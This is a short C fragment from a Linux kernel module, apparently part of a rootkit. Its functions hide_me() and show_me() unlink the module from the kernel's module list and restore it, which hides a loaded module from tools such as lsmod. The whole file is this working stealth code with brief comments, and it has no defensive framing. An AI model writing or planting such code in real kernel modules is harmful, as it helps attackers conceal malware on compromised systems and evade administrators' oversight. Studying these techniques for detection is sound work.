#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

static struct list_head *prev_module;

//hiding the user
void hide_me(void){
    prev_module = THIS_MODULE->list.prev;// saves the previus item in the linked list
    list_del(&THIS_MODULE->list);// delete then current item from the linked list
}

void show_me(void){
    list_add(&THIS_MODULE->list, prev_module); // adds back the current item to the linked list
}